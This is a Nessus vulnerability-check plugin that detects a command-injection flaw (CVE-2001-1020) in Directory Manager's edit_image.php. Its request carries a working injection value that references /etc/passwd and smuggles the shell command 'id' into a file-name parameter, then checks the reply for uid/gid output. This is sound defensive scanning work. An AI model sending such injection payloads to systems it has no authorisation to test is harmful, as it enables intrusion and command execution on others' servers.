# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# GPL
#
# Ref: http://cert.uni-stuttgart.de/archive/bugtraq/2001/09/msg00052.html
# 


if(description)
{
 script_id(11104);
 script_version ("$Revision: 1.5 $");
 script_bugtraq_id(3288);
 script_cve_id("CVE-2001-1020");
 
 name["english"] = "Directory Manager's edit_image.php";
 script_name(english:name["english"]);
 
 desc["english"] = "
Directory Manager is installed and does not properly filter user input.
A cracker may use this flaw to execute any command on your system.

Solution : Upgrade your software or firewall your web server
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Detects edit_image.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
i = string(dir, "/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20");
req = http_get(port: port, item: i);
buf = http_keepalive_send_recv(port:port, data:req);
if( buf == NULL ) exit(0);
if (("uid=" >< buf) && ("gid=" >< buf))
 {
	security_hole(port);
	exit(0);
 }
}
